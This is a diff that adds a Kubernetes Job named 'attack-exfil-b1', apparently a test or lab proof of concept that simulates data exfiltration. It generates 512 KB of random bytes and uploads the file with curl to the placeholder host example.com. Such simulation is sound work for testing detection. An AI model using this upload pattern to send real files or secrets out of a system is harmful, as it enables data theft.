@@ -1,0 +1,19 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: attack-exfil-b1
+  namespace: iiot-poc
+spec:
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: exf
+          image: curlimages/curl:8.10.1
+          command: ["/bin/sh","-lc"]
+          args:
+            - |
+              dd if=/dev/urandom of=/tmp/data.bin bs=1K count=512 ; \
+              T0=$(date +%s); echo "t0=$T0"; \
+              curl -s -F "file=@/tmp/data.bin" http://example.com/  || true ; \
+              echo done
